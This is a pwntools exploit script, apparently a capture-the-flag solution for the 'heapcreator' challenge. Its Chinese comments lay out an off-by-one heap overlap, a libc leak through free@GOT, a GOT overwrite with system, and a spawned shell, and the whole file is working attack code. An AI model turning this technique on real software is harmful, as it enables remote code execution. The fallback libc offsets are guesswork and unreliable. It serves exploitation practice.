#!/usr/bin/env python3
"""
heapcreator — 直接覆写 free@GOT 版
===================================
攻击链:
  off-by-one → overlap → 控 data_ptr → 读 free@GOT (leak)
  → data_ptr 没变, 还是在 free@GOT → 直接写 system → free("/bin/sh") = shell

注意: 不跳 __free_hook, 直接改 GOT (Partial RELRO = 可写)
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

LOCAL = False
elf = ELF('./heapcreator')

if LOCAL:
    p = process('./heapcreator')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('node5.buuoj.cn', 28269)

def create(size, content):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Size of Heap : ', str(size).encode())
    p.sendafter(b'Content of heap:', content)

def edit(idx, content):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', str(idx).encode())
    p.sendafter(b'Content of heap : ', content)

def show(idx):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :', str(idx).encode())

def delete(idx):
    p.sendlineafter(b'Your choice :', b'4')
    p.sendlineafter(b'Index :', str(idx).encode())

# ═══════════ Phase 1: Off-by-One ═══════════
create(0x18, b'A' * 0x18)           # idx 0
create(0x10, b'B' * 0x10)           # idx 1
edit(0, b'A' * 0x18 + b'\x41')      # S1.size: 0x21→0x41
delete(1)                            # D1→0x20tcache, S1→0x40tcache

# ═══════════ Phase 2: Overlap → leak free ═══════════
free_got = elf.got['free']           # 0x602018

create(0x30, flat({
    0x00: b'\x00' * 0x20,
    0x20: p64(0x30),                 # struct->size
    0x28: p64(free_got)              # struct->data_ptr → free@GOT
}))

show(1)
p.recvuntil(b'Content : ')
free_addr = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
log.success(f'free @ {hex(free_addr)}')

# ═══════════ Phase 3: 算 libc ═══════════
# 用 LibcSearcher 搜 (pip install LibcSearcher)
try:
    from LibcSearcher import LibcSearcher
    obj = LibcSearcher('free', free_addr)
    libc_base = free_addr - obj.dump('free')
    system = libc_base + obj.dump('system')
    log.success(f'libc_base: {hex(libc_base)}')
    log.success(f'system:    {hex(system)}')
except:
    log.warning('LibcSearcher not found, trying common offsets...')
    # 常见偏移试一个, 不对就换
    for offset in [0x97540, 0x98540, 0x98350, 0x9a150]:
        libc_base = free_addr - offset
        if libc_base & 0xfff == 0:       # 必须页对齐
            system = libc_base + 0x4f550
            log.info(f'Trying free_offset={hex(offset)}, system={hex(system)}')
            break
    else:
        log.error('No matching libc offset found! Use the leaked addr to search.')
        log.info(f'Leaked free: {hex(free_addr)} (ends in {hex(free_addr & 0xfff)})')
        p.close()
        exit()

# ═══════════ Phase 4: 写 system → free@GOT ═══════════
# data_ptr 目前还指向 free@GOT, 直接 edit 覆写!
edit(1, p64(system))
log.success(f'free@GOT overwritten with system')

# ═══════════ Phase 5: free("/bin/sh") ═══════════
create(0x10, b'/bin/sh\x00')         # idx 2 (空槽)
delete(2)                            # free("/bin/sh") → system("/bin/sh")

p.interactive()
